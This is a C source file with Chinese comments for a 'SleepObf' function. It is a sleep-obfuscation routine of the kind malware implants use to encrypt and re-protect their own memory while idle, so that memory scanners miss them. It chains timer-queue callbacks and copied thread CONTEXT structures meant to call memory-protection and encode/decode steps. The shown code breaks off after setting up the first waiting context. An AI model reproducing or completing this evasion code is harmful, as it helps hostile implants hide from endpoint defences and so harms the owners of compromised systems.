#include "SleepObf.h"
#include "PEBWalk.h"
#include "Memory.h"
#include "NativeDefs.h"


bool EventSet(void* event) {
    if (!API.NtSetEvent(event, 0)) {
        return true;
    }

    return false;
}

void SleepObf(uint32_t time) {
    // 创建 Timer 队列
    void* hTimerQueue = API.CreateTimerQueue();
    if (hTimerQueue) {
        // 设定事件，用于等待保证运行顺序
        void* EvtWait = 0;
        void* EvtAwake = 0;
        if (!API.NtCreateEvent(&EvtWait, 0x1F0003, 0, NotificationEvent, false) &&
            !API.NtCreateEvent(&EvtAwake, 0x1F0003, 0, NotificationEvent, false)
        ) {
            struct CONTEXT* OriginCtx = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
            void* hTimer = 0;
            if (!API.CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)API.RtlCaptureContext, (void*)OriginCtx, 0, 0, 0x00000008)) {
                
                // 开始布置睡眠混淆
                struct CONTEXT* Waiting = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Waiting, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ProtRW = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ProtRW, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Encode = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Encode, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ToSleep = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ToSleep, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Decode = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Decode, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* ProtRX = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(ProtRX, OriginCtx, sizeof(struct CONTEXT));
                struct CONTEXT* Awaking = (struct CONTEXT*)MemAlloc(sizeof(struct CONTEXT));
                MemCopy(Awaking, OriginCtx, sizeof(struct CONTEXT));

                
                Waiting->Rip = API.WaitForSingleObjectEx;
                Waiting->Rcx = EvtWait;
                Waiting->Rdx = 0xffffffff;
                Waiting->R8 = false;


                
            }
        }
    }
}